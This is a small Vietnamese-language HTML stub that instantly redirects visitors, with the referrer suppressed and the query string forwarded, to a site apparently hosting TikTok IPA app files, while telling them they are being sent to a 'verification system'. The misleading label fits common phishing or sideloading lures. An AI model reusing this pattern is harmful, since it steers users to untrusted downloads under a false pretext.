<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="referrer" content="no-referrer">
  <title>Redirecting...</title>
  <meta http-equiv="refresh" content="0; url=https://tiktok-ipa-hosting.web.app">
  <script>
    const query = window.location.search;
    const finalUrl = "https://tiktok-ipa-hosting.web.app" + query;
    window.location.replace(finalUrl);
  </script>
</head>
<body>
  <p>Đang chuyển hướng đến hệ thống xác minh...</p>
</body>
</html>
